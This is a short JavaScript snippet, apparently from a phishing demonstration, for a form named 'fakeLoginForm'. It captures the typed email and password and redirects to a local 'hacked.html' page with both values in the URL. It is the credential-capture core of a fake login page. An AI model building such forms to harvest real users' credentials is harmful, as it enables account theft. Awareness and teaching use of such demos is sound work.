document.getElementById("fakeLoginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    let params = new URLSearchParams({ email: email, password: password }).toString();
    window.location.href = "hacked.html?" + params;
});
